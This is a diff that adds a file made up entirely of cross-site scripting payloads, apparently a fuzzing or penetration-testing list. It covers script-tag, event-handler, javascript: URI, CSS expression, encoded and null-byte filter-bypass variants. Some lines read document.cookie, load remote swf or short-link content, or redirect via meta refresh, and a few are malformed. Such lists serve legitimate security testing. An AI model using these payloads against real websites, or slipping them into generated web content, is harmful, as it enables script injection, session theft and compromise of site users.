@@ -1,0 +1,171 @@
+﻿</ScrIpt><script>alert(1)</script>
+<scr<script>ipt>alert("XSS")</scr<script>ipt>
+<div onclick="alert('xss')">
+<div style="color: expression(alert('XSS'))">
+<div style="color: '<'; color: expression(alert('XSS'))">
+%c1;alert(/xss/);//
+"onclick=alert(1)//
+"><!--   --><script>alert(xss);<script>
+<script>alert(navigator.userAgent)<script>
+<script>alert(88199)</script>
+<script>confirm(88199)</script>
+<script>prompt(88199)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(88199)</script>
+<script>+alert(88199)</script>
+<script>alert(/88199/)</script>
+<script src=data:text/javascript,alert(88199)></script>
+<script src=&#100&#97&#116&#97:text/javascript,alert(88199)></script>
+<script>alert(String.fromCharCode(49,49))</script>
+<script>alert(/88199/.source)</script>
+<script>setTimeout(alert(88199),0)</script>
+<script>document['write'](88199);</script>
+<anytag onmouseover=alert(15)>
+<anytag onclick=alert(16)>
+<a onmouseover=alert(17)>
+<a onclick=alert(18)>
+<a href=javascript:alert(19)>
+<button/onclick=alert(20)>
+<form><button
+formaction=javascript&colon;alert(21)>
+<form/action=javascript:alert(22)><input/type=submit>
+<form onsubmit=alert(23)><button>
+<form onsubmit=alert(23)><button>
+<img src=x onerror=alert(24)> 29
+<body/onload=alert(25)><body>
+onscroll=alert(26)><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br>
+<input autofocus>
+<iframe src="http://0x.lv/xss.swf"></iframe>
+<iframe/onload=alert(document.domain)></iframe>
+<IFRAME SRC="javascript:alert(29);"></IFRAME>
+<meta http-equiv="refresh" content="0;
+url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E">
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object>
+<object data="javascript:alert(document.domain)">
+<marquee onstart=alert(30)></marquee>
+<isindex type=image src=1 onerror=alert(31)>
+<isindex action=javascript:alert(32) type=image>
+<input onfocus=alert(33) autofocus>
+<input onblur=alert(34) autofocus><input autofocus>
+<script>alert(1);</script>
+<script>prompt(1);</script>
+<script>confirm      (1);</script>
+<a  href=“http://www.google.com">Clickme</a>
+<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>
+<a href=”javascript:alert(1)”>Clickme</a>
+<body/onhashchange=alert(1)><a href=#>clickit
+<img src=x      onerror=prompt(1);>
+<img/src=aaa.jpg      onerror=prompt(1);
+<video src=x      onerror=prompt(1);>
+<audio src=x      onerror=prompt(1);>
+<iframesrc="javascript:alert(2)">
+<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<embed/src=//goo.gl/nlX0P>
+<form action="Javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<isindex action=data:text/html, type=image
+<span class="pln">    </span><span class="tag">&lt;formaction</span><span class="pun">=</span><span class="atv">&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;</span><span class="tag">&gt;&lt;button&gt;</span><span class="pln">CLICK</span>
+<isindexformaction="javascript:alert(1)"      type=image>
+<input type="image" formaction=JaVaScript:alert(0)>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<table background=javascript:alert(1)></table> // Works on Opera 10.5      and IE6
+<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
+<object/data=//goo.gl/nlX0P?
+<applet code="javascript:confirm(document.cookie);"> // Firefox Only
+<embed  code="http://businessinfo.co.uk/labs/xss/xss.swf"      allowscriptaccess=always>
+<svg/onload=prompt(1);>
+<marquee/onstart=confirm(2)>/
+<body onload=prompt(1);>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<q/oncut=open()>
+<q/oncut=alert(1)>
+<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>
+<body  language=vbsonload=alert-1 // Works with IE8
+<command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6    9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command>
+<a onmouseover="javascript:window.onerror=alert;throw 1>
+<img src=x onerror="javascript:window.onerror=alert;throw 1">
+<body/onload=javascript:window.onerror=eval;throw&#039;=alert\x281\x29&#039;;
+<img style="xss:expression(alert(0))"> // Works upto IE7.
+<div style="color:rgb(&#039;&#039;x:expression(alert(1))"></div>
+<style>#test{x:expression(alert(/XSS/))}</style>
+<a onmouseover=location=’javascript:alert(1)>click
+<body onfocus="location=&#039;javascrpt:alert(1) >123
+<meta http-equiv="refresh"      content="0;url=//goo.gl/nlX0P">
+<meta http-equiv="refresh"      content="0;javascript&colon;alert(1)"/>
+<svg xmlns="http://www.w3.org/2000/svg"><g      onload="javascript:\u0061lert(1);"></g></svg>
+<svg xmlns:xlink=" r=100 /><animate attributeName="xlink:href"      values=";javascript:alert(1)" begin="0s"      dur="0.1s" fill="freeze"/>
+<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"</svg> 
+<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<svg><script>alert&#40/1/&#41</script>
+<svg><script>alert&#40      1&#41 
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<a  href="j&#x26;#x26#x41;vascript:alert%252831337%2529">Hello</a>
+<input value="XSStest" type=text>
+"><imgsrc=x  onerror=prompt(0);>
+" autofocusonfocus=alert(1)
+" onmouseover="prompt(0) x="
+" onfocusin=alert(1)     autofocus x="
+" onfocusout=alert(1)     autofocus x="
+" onblur=alert(1) autofocus     a="
+";alert(1) 
+";document.body.addEventListener("DOMActivate",alert(1))
+";document.body.addEventListener("DOMActivate",prompt(1))
+";document.body.addEventListener("DOMActivate",confirm(1))
+<a href=”Userinput”>Click</a>
+<a href=”javascript:alert(1)//”>Click</a>
+javascript&#058;alert(1)
+javaSCRIPT&colon;alert(1)
+JaVaScRipT:alert(1)
+javas&Tab;cript:\u0061lert(1);
+javascript:\u0061lert&#x28;1&#x29
+avascript&#x3A;alert&lpar;document&period;cookie&rpar;
+vbscript:alert(1);
+vbscript&#058;alert(1);
+vbscr&Tab;ipt:alert(1)"
+encodeURIComponent(&#039;userinput&#039;)
+-alert(1)-
+-prompt(1)-
+-confirm(1)-
+encodeURIComponent(&#039;&#039;-alert(1)-&#039;&#039;)
+encodeURIComponent(&#039;&#039;-prompt(1)-&#039;&#039;)
+<svg><script>varmyvar=”YourInput”;</script></svg>
+www.site.com/test.php?var=text”;alert(1)//
+<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+src=x onerror=prompt(0);
+???script?alert(1)?/script?
+<scri%00pt>alert(1);</scri%00pt>
+<scri\x00pt>alert(1);</scri%00pt>
+<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
+<script>alert(1);</script>
+<%0ascript>alert(1);</script>
+<%0bscript>alert(1);</script>
+<//     style=x:expression\28write(1)\29>
+<!--[if]><script>alert(1)</script     -->
+<?xml-stylesheet     type="text/css"?><root     style="x:expression(write(1))"/>
+<%div%20style=xss:expression(prompt(1))>
+<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
+<iframesrc=&#039;http://www.target.com?foo="xss  autofocus/AAAAA  onfocus=location=window.name//&#039;
+name="javascript:alert("XSS")"></iframe>
+<script> vari=location.hash; document.write(i); </script>
+<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()
+<scri%00pt>confirm(0);</scri%00pt>
+<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<marquee/onstart=confirm(2)>
+<table background="javascript:alert(1)"></table> 
+"/><marquee  onfinish=confirm(123)>a</marquee>
+<svg/onload=prompt(1);> 
+<isindex action="javas&tab;cript:alert(1)" type=image>
+<marquee/onstart=confirm(2)>
+
+
+
+
